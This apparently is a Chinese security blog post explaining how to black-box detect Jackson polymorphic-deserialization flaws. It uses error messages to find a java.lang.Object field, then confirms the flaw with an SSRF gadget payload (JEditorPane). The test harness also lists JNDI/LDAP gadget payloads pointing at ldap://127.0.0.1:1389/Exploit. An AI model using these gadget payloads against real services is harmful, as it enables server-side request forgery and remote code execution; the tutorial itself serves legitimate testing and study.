#  如何黑盒检测fasterxml-jackson反序列化漏洞

原创 conman  [ conman ](javascript:void\(0\);)

**conman** ![]()

微信号 gh_1ccd784c4992

功能介绍 分享信息安全相关的知识

____

___发表于_

收录于合集

#web安全 14 个

#网络安全 18 个

#反序列化 2 个

## 序

前段时间，fasterxml jackson又出新的反序列化的payload了，看看各家的通告。心里想着，啥时候能测到一个反序列化漏洞。

网上看到的分析，大部分都是分析payload的原理。但是作为一个只能黑盒盲测的选手，如何找到并判断出jackson漏洞呢？

## 识别jackson

由于是黑盒，我们需要猜测后端有没有用jackson。

### application/json

一个可能的点是，`Content-Type: application/json`，后端会处理json数据。但是后端用的什么来处理的，还需要判断。

### com.fasterxml.jackson

我们在post数据中随便输入数据`aaa`，发现后端返回的错误信息里面显示`com.fasterxml.jackson`，可以初步判断使用了jackson。

## 瞎测

由于之前没有碰到过jackson的实际案例，去网上搜索了一些分析文章，随便找了几个payload来测试，一顿复制粘贴。全部报错。

    
    
    Exception in thread "main" com.fasterxml.jackson.databind.exc.MismatchedInputException: Cannot deserialize instance of `***` out of START_ARRAY token  
    

## 深入理解

    
    
    public class TestMain {  
        public static void main(String args[]) throws IOException {  
            ObjectMapper mapper = new ObjectMapper();  
            mapper.enableDefaultTyping();  
            //String json="{\"age\":10,\"name\":\"l1nk3r\",\"cc\":\"dd\",\"sex\":[\"com.mytest.MySex\",{\"sex\":100}]}";  
            //String json="[\"org.springframework.context.support.FileSystemXmlApplicationContext\",{\"sex\":100}]";  
            //String json="{\"age\":10,\"name\":\"l1nk3r\",\"aa\":[\"org.springframework.context.support.FileSystemXmlApplicationContext\",{\"sex\":100}]}";  
            //String json = "[\"org.apache.xbean.propertyeditor.JndiConverter\", {\"asText\":\"ldap://localhost:1389/ExportObject\"}]";  
            //String json="{\"age\":10,\"name\":\"l1nk3r\",\"aa\":[\"org.apache.xbean.propertyeditor.JndiConverter\", {\"asText\":\"ldap://127.0.0.1:1389/Obj\"}]}";  
            String json="{\"age\":10,\"name\":\"bbb\",\"sex\":{\"sex\":1},\"aa\":[\"javax.swing.JEditorPane\", {\"page\":\"http://127.0.0.1:8000?23333\"}]}";  
      
            //String json="{\"age\":10,\"name\":\"l1nk3r\",\"aa\":[\"com.oracle.wls.shaded.org.apache.xalan.lib.sql.JNDIConnectionPool\",{\"jndiPath\":\"ldap://127.0.0.1:1389/Exploit\"}]}";  
            //People p2 = mapper.readValue(json, People.class);  
            //String json = "[\"com.oracle.wls.shaded.org.apache.xalan.lib.sql.JNDIConnectionPool\",{\"jndiPath\":\"ldap://127.0.0.1:1389/Exploit\"}]";  
            People p2 = mapper.readValue(json,People.class);  
            //Object o2 = mapper.readValue(json,Object.class);  
            System.out.println(p2);  
        }  
    }  
    

网络上面给出的样例更多是`Object o2 =
mapper.readValue(json,Object.class)`，可以直接读array，所以没有报错，而我们直接拿array的数据基本都是报错的。知道这个点之后，我们后面就可以想想如何判断了。

### 存在条件

漏洞存在的条件，引用自[2]和[6]

    
    
    在设置为下面三种方式时，可以触发反序列化:  
    enableDefaultTyping()  
    @JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)  
    @JsonTypeInfo(use = JsonTypeInfo.Id.MINIMAL_CLASS)  
    
    
    
    1.Accepts JSON content sent by untrusted client (composed manually or by code you did not write and have no visibility or control over) — meaning that you can not constrain JSON itself that is being sent  
    2.Has at least one specific “gadget” class to exploit in the Java classpath: and specifically class from these that works with Jackson (most gadgets only work with specific library or libraries — most commonly reported ones for example only work with JDK serialization)  
    3.Enable polymorphic type handling for properties with nominal type of java.lang.Object (or one of small number of “permissive” tag interfaces; java.util.Serializable, java.util.Comparable)  
    4.Use version of Jackson that does not (yet) block “gadget” class in question (set of published exploits grows over time so it is a race between exploits and patches)  
    

特别注意第3点，需要type为java.lang.Object，这也是为什么样例里面为Object.class，以及aa为Object aa的原因。

这些是必要条件，而我们实际黑盒测试时，并不能知道全部的条件，所以使用代码进行判断。

## 判断

在应用会返回错误信息的情况下，我们可以根据错误信息来获取相应的信息。如果没有，那就看运气盲测了。

使用不存在的property来获取property信息，可以看到只有sex这个property

    
    
    String json="{\"age\":10,\"name\":\"test\",\"sex\":{\"sex\":1,\"aa\":2},\"aa\":[\"javax.swing.JEditorPane\", {\"page\":\"http://127.0.0.1:8000?23333\"}]}";  
      
    Exception in thread "main" com.fasterxml.jackson.databind.exc.UnrecognizedPropertyException: Unrecognized field "aa" (class com.mytest.MySex), not marked as ignorable (one known property: "sex"])  
      
    

继续判断上一层，(4 known properties: “aa”, “name”, “sex”, “age”]

    
    
    String json="{\"age\":10,\"name\":\"test\",\"sex\":{\"sex\":1},\"bb\":2,\"aa\":[\"javax.swing.JEditorPane\", {\"page\":\"http://127.0.0.1:8000?23333\"}]}";  
      
    Exception in thread "main" com.fasterxml.jackson.databind.exc.UnrecognizedPropertyException: Unrecognized field "bb" (class com.mytest.People), not marked as ignorable (4 known properties: "aa", "name", "sex", "age"])  
    

由于我们的payload需要使用array，这里我们将name设为[]，可以看到java.lang.String类型，后续一个一个测试。

    
    
    String json="{\"age\":10,\"name\":[],\"sex\":{\"sex\":1},\"aa\":[\"javax.swing.JEditorPane\", {\"page\":\"http://127.0.0.1:8000?23333\"}]}";  
      
    Exception in thread "main" com.fasterxml.jackson.databind.exc.MismatchedInputException: Cannot deserialize instance of `java.lang.String` out of START_ARRAY token  
    

当测试到aa时，发现java.lang.Object

    
    
    String json="{\"age\":10,\"name\":\"bbb\",\"sex\":{\"sex\":1},\"aa\":[],\"aab\":[\"javax.swing.JEditorPane\", {\"page\":\"http://127.0.0.1:8000?23333\"}]}";  
      
    Exception in thread "main" com.fasterxml.jackson.databind.exc.MismatchedInputException: Unexpected token (END_ARRAY), expected VALUE_STRING: need JSON String that contains type id (for subtype of java.lang.Object)  
    

由于rce payload可能会被拦截，或者确实模块，或者版本问题，这里我们使用一个ssrf的payload来盲测。

    
    
    String json="{\"age\":10,\"name\":\"bbb\",\"sex\":{\"sex\":1},\"aa\":[\"javax.swing.JEditorPane\", {\"page\":\"http://127.0.0.1:8000?23333\"}]}";  
    

最终，我们的http
log可以看到请求。发现此处存在漏洞，进一步的利用可以使用marshalsec来利用。测试下来，三种写法下，这个payload的结果一样。

## 总结

jackson的反序列化漏洞利用存在条件，不是直接一顿盲测就可以的。只有清楚判断条件之后，才明白为什么会是这样的返回。需要找到java.lang.Object的property才可以。

– 那今天挖到jackson反序列化漏洞了吗？

– 我不知道，你说呢？

## 引用

  1. Jackson-反序列化汇总

  2. CVE-2020-8840

  3. Exploiting the Jackson RCE: CVE-2017-7525

  4. Jackson系列一——反序列化漏洞基本原理

  5. FasterXML jackson-databind CVE

  6. on-jackson-cves-dont-panic-here-is-what-you-need-to-know

  

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

